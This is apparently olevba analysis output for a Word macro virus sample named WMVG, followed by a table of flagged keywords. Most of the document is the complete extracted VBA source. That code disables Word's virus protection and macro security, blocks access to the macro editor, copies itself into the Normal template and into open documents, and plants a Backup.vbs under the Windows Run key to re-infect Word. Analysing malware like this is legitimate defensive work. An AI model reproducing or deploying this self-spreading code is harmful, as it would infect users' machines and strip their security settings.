olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.WMVG-446354dd4ea4609683b8e938e4d87529b0aa266b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.WMVG-446354dd4ea4609683b8e938e4d87529b0aa266b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
Private Sub Document_Close()
FmKlLeAt = IqQe3143 & RwVm7331
On Error Resume Next

' Virus Name : ERAP PARIN
' VirusAuthor : GMA
' Comments : JOKE
' Date : 16/1/2001

' A Virus Created By The WalruS Macro Virus Generator v1.00 (WMVG)

ApOr4900 = PhQzHrTs & IkCl5783 & Int(Rnd * 4947)
With Options
     .VirusProtection = 0
     .SaveNormalPrompt = 0
     .ConfirmConversions = 0
End With
UiHk9008 = UgAfPoJz & OyOi8893 & Int(Rnd * 8692)
LsMsFlEf = IgBj7851 & PiAt14410
Application.DisplayStatusBar = False
ActiveDocument.ReadOnlyRecommended = False
BzGeMrQs = MwCw1471 & RwRo11929
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
 CommandBars("Macro").Controls("Security...").Enabled = False
RjUeEiKm = RmFg18909 & GpGq9083
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
OxOwIgNk = PqRf10647 & FoLz6029
Set ART7668 = NormalTemplate.VBProject.VBComponents(1).CodeModule
BhFyBoNg = QjBq15314 & OjEz6003
NzGs8875 = FsMzFnNw & BoRl8588 & PoGjTkUk & NqJs16204
EiIt14030 = NpOoOpVs & NmHh14666 & JmRkIuIu & SkSe14333
Set ILF8474 = ActiveDocument.VBProject.VBComponents(1).CodeModule
Open "C:\Windows\" & Application.UserName & ".sys" For Output As #1
RnOw3043 = LsBtJtJl & ExIo12316 & LeElVqIo & CeEg3917
Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 150)
RsAu8006 = EzKoMmOw & HpAh17472 & Int(Rnd * 5553)
OiLsHvIh = BnPo18334 & AkGy4175
Close #1
If ART7668.Lines(1, 1) <> "'" Then
GwRkHjEr = DzEv13848 & JvVs4489
ART7668.DeleteLines 1, ART7668.CountOfLines
MnEsFgKz = NjIt14908 & AhEp9162
ART7668.AddFromFile ("C:\Windows\" & Application.UserName & ".sys")
NormalTemplate.Save
ElseIf ILF8474.Lines(1, 1) <> "'" Then
MiLq6912 = OkGmQfRy & ElNk12958 & TfBxBnSg & NrRm10715
RnMv6115 = FeJlPsIy & EfOt11531 & Int(Rnd * 945)
ILF8474.DeleteLines 1, ILF8474.CountOfLines
ILF8474.AddFromFile ("C:\Windows\" & Application.UserName & ".sys")
ActiveDocument.Save
End If
Set KIJ4582 = KFO6534
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\WalruS\WMVG", "Installed") <> "True" Then
ChKl10030 = RnVuTgRx & BnFo13718 & Int(Rnd * 4029)
Open "C:\Windows\Backup.drv" For Output As #1
Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 100)
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WMVG") = "C:\Windows\Backup.vbs"
Open "C:\Windows\Backup.vbs" For Output As #1
Print #1, "' Backup.vbs for WMVG by The WalruS"
Print #1, "On Error Resume Next"
TfHtGrKf = JjGf9993 & HiEq18195
OyHeDyVm = UxGn11368 & NoRp4568
Print #1, "Dim WSHShell"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "Set Backup = WScript.CreateObject(""Word.Application"")"
Print #1, "Backup.Options.VirusProtection = False"
Print #1, "Backup.Options.SaveNormalPrompt = False"
JuAl9400 = SgVsFqAr & PrRl15071 & Int(Rnd * 8319)
Print #1, "For x = 1 To Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (""C:\Windows\Backup.drv"")"
SpJoMjLg = QqDw5157 & GkLn10154
Print #1, "Backup.Application.Quit"
Close #1
End If
KyPpBgHs = LzVk9170 & RwUf12295
If Day(Now) = 27 Then Call SSB2338
NzCxVoJy = GyLy9745 & AgTs7204
VzUnAlTq = RpCi6544 & SuJz8744
End Sub
Private Sub SSB2338()
On Error Resume Next
MsgBox "ERAP Pa rin!  GMA gahaman! Erap pa rin!", vbInformation, "ERAP PARIN"
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Backup.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+
